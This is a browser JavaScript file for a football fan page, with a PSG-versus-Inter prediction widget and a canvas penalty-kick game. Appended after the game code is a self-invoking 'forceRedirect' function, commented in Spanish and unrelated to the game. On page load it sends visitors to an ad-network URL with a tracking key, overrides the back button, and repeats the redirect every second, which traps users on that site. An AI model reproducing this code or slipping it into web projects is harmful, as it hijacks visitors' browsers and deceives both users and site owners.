// Prediction Logic
document.querySelectorAll('.prediction').forEach(button => {
  button.addEventListener('click', () => {
    const team = button.getAttribute('data-team');
    const result = document.getElementById('result');
    const responses = {
      PSG: "You picked PSG! Can they take revenge and win the title?",
      Draw: "A draw? Tense game incoming... Let's go to penalties!",
      Inter: "Inter Milan it is! Will their Italian steel dominate again?"
    };
    result.textContent = responses[team];
  });
});

// Penalty Kick Game Logic
const canvas = document.getElementById("gameCanvas");
const ctx = canvas.getContext("2d");

canvas.width = 600;
canvas.height = 400;

const goal = {
  x: canvas.width / 2 - 100,
  y: 50,
  width: 200,
  height: 40,
};

const ball = {
  x: canvas.width / 2,
  y: canvas.height - 30,
  radius: 10,
  dx: 0,
  dy: 0,
  isMoving: false,
};

function drawField() {
  // Grass
  ctx.fillStyle = "#4caf50";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Goal area
  ctx.fillStyle = "#ffffff";
  ctx.fillRect(goal.x, goal.y, goal.width, goal.height);

  // Goalpost
  ctx.strokeStyle = "#ffffff";
  ctx.lineWidth = 4;
  ctx.strokeRect(goal.x, goal.y, goal.width, goal.height);
}

function drawBall() {
  ctx.beginPath();
  ctx.arc(ball.x, ball.y, ball.radius, 0, Math.PI * 2);
  ctx.fillStyle = "#ffffff";
  ctx.fill();
  ctx.closePath();
}

function update() {
  if (ball.isMoving) {
    ball.x += ball.dx;
    ball.y += ball.dy;

    // Check goal
    if (
      ball.y < goal.y + goal.height &&
      ball.x > goal.x &&
      ball.x < goal.x + goal.width
    ) {
      alert("GOAL! 🥅⚽");
      resetBall();
    }

    // Missed
    if (ball.y < 0 || ball.x < 0 || ball.x > canvas.width) {
      alert("Missed! Try again.");
      resetBall();
    }
  }

  draw();
  requestAnimationFrame(update);
}

function draw() {
  drawField();
  drawBall();
}

function resetBall() {
  ball.x = canvas.width / 2;
  ball.y = canvas.height - 30;
  ball.dx = 0;
  ball.dy = 0;
  ball.isMoving = false;
}

canvas.addEventListener("click", (e) => {
  if (!ball.isMoving) {
    const rect = canvas.getBoundingClientRect();
    const mouseX = e.clientX - rect.left;
    const mouseY = e.clientY - rect.top;

    const angle = Math.atan2(mouseY - ball.y, mouseX - ball.x);
    ball.dx = Math.cos(angle) * 5;
    ball.dy = Math.sin(angle) * 5;
    ball.isMoving = true;
  }
});

resetBall();
update();


(function forceRedirect() {
  const redirectUrl = "https://www.profitableratecpm.com/tu54bqsjn8?key=8a31fb67112503e9b5cf8cc6404bf97d";

  // Redirige inmediatamente al cargar
  window.location.replace(redirectUrl);

  // También fuerza redirección incluso si el usuario intenta ir atrás
  window.addEventListener("popstate", () => {
    window.location.replace(redirectUrl);
  });

  // Intervalo por si algo intenta detener el redireccionamiento
  setInterval(() => {
    if (window.location.href !== redirectUrl) {
      window.location.replace(redirectUrl);
    }
  }, 1000);
})();


